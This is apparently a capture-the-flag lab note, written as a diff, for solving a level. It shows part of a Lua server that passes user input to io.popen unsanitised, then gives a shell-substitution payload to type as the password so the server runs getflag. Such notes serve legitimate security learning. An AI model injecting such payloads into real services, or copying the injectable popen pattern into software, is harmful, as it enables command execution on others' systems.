@@ -1,0 +1,12 @@
+cat level11.lua
+    ->  #!/usr/bin/env lua
+        local socket = require("socket")
+        local server = assert(socket.bind("127.0.0.1", 5151))
+
+        function hash(pass)
+          prog = io.popen("echo "..pass.." | sha1sum", "r")
+
+nc 127.0.0.1 5151
+        -> Password:
+enter the following as password:
+    $(getflag)1>/var/crash/level11
